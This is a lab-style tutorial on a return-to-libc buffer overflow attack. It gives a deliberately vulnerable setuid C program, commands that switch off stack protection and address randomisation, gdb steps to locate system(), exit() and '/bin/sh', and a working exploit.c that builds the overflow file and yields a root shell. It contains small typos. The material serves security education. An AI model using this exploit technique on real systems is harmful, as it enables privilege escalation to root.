# Return-to-libc-Attack

### Introduction

- libc is an existing library required by all the c programs
- return-to-libc exploit looks for the memory address of **system()** and the string **"/bin/sh"**. It jumps to **system()** and uses that function call to spawn a shell
- Variant of buffer-overflow attack
- **It causes the vulnerable program to jump to some existing code, such as the system() function in the libc library, which is already loaded into a process’s memory space**
- It does not use a shell-code
- Non‐executable stack countermeasure, it does not need an executable stack

### The vulnerable program:

```c
// stack.c
#incldue<stdio.h>
#include<string.h>
int vul_func(char *str)
{
	char buffer[50];
	strcpy (buffer, str);
	return 1;
}

int main (int argc, char **argv)
{
	char str[240];
	FILE *badfile;
	
	badfile = fopen ("badfile", "r");
	fread(str, sizeof(char), 200, badfile);
	vul_func(str);
	
	printf("Returned Properly\n");
	return 1;
}
```

**The above program has a buffer overflow vulnerability.** It first reads an input of size 200 bytes from a file called “badfile” into a buffer of size 50, causing the overflow. The function fread() does not check boundaries, so buffer overflow will occur.

The GCC compiler implements a security mechanism called ”Stack Guard” to prevent buffer overflows. In the presence of this protection, buffer overflow will not work. We can disable this protection if you compile the program using the **-fno-stack-protector** switch.

```c
gcc -fno-stack-protector -z noexecstack -o stack stack.c 
```

Linux-based systems uses address space randomisation to randomise the starting address of heap and stack. This makes guessing the exact addresses difficult. So we will disable this feature using the following command:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

“Non executable stack” countermeasure is switched *on*, StackGuard protection is switched ***off*** and address randomisation is turned ***off***.

Root owned Set-UID program

```bash
sudo chown root stack
sudo chmod 4755 stack

>badfile
```

### **To find system()’s address**

- Debug the vulnerable program using gdb
- Using p (print) command, print address of system() and exit().

```bash
gdb stack 
(gdb) run 
(gdb) p system 
(gdb) p exit 
(gdb) quit
```

![Screenshot 2022-02-22 at 9.28.50 AM.png](Return-to-libc%20Attack%206847c5787a564f3fbb1c52c0989713d5/Screenshot_2022-02-22_at_9.28.50_AM.png)

From the above gdb commands, we can find out that the address for the system() function is `0xb7e5f430` , and the address for the exit() function is `0xb7e52fb0`

### **To find “/bin/sh” string address**

Export “MYSHELL” environment variable and execute the code.

`export MYSHELL="/bin/sh"`

We will use the address of this variable as an argument to system() call. The location of this variable in the memory can be found out easily using the following program:

```c
// envsh.c
#include <stdio.h>
int main(){
	char *shell = (char *)getenv("MYSHELL");
	
	if(shell){
		printf("Value: %s\n", shell);
		printf("Address: %x\n", (unsigned int)shell);
	}
	
	return 1;
}
```

```c
gcc envsh.c -o envsh
./envsh
```

![Screenshot 2022-02-22 at 9.32.27 AM.png](Return-to-libc%20Attack%206847c5787a564f3fbb1c52c0989713d5/Screenshot_2022-02-22_at_9.32.27_AM.png)

“/bin/sh” string address - `0xbffffe8c`

### **Argument for system()**

Arguments are accessed with respect to ebp. We need to know the offset value.

```c
gcc -fno-stack-protector -z noexecstack **-g** -o stack_dbg stack.c
gdb stack_dbg
(gdb) b vul_func
(gdb) run

(gdb) p &buffer # buffer address
(gdb) p $ebp    # ebp address
(gdb) p ebp_address - buffer_address # offset
(gdb) quit
```

![Screenshot 2022-02-22 at 10.09.12 AM.png](Return-to-libc%20Attack%206847c5787a564f3fbb1c52c0989713d5/Screenshot_2022-02-22_at_10.09.12_AM.png)

ebp+4 points to the first parameter of your function, here it refers to the return address of system()

### Exploit

Malicious code:

```c
// exploit.c
#include <stdio.h>
#include <string.h>
int main (int argc, char **argv)
{
        char buf[200];
        FILE *badfile;

        memset(buf, 0xaa, 200);

        *(long *) &buf[70] = 0xbffffe8c; // The address of "/bin/sh" -> ebp + 12
        *(long *) &buf[66] = 0xb7e52fb0; // The address of exit() -> ebp + 8
        *(long *) &buf[62] = 0xb7e5f430; // The address of system() -> ebp + 4

        badfile = fopen("./badfile", "w");
        fwrite(buf, sizeof(buf), 1, badfile);
        fclose(badfile);
}
```

```c
gcc exploit.c -o exploit
./exploit
./stack
```

![Screenshot 2022-02-22 at 10.11.45 AM.png](Return-to-libc%20Attack%206847c5787a564f3fbb1c52c0989713d5/Screenshot_2022-02-22_at_10.11.45_AM.png)

Gained root shell.

---
